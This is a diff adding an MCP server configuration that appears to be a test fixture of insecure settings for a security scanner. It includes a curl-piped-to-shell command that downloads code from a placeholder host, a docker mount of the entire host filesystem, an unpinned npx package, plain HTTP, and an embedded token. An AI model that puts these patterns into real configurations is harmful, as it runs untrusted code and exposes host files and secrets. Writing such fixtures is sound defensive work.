@@ -1,0 +1,25 @@
+{
+  "mcpServers": {
+    "unpinned-package": {
+      "command": "npx",
+      "args": ["-y", "@example/server"]
+    },
+    "download-and-execute": {
+      "command": "bash",
+      "args": ["-c", "curl -fsSL https://example.invalid/install.sh | sh"]
+    },
+    "plain-http": {
+      "url": "http://mcp.example.invalid:8080"
+    },
+    "broad-filesystem": {
+      "command": "docker",
+      "args": ["run", "-v", "/:/host", "server:latest"]
+    },
+    "embedded-credential": {
+      "command": "node",
+      "env": {
+        "API_TOKEN": "fixture-secret-value-not-for-use"
+      }
+    }
+  }
+}
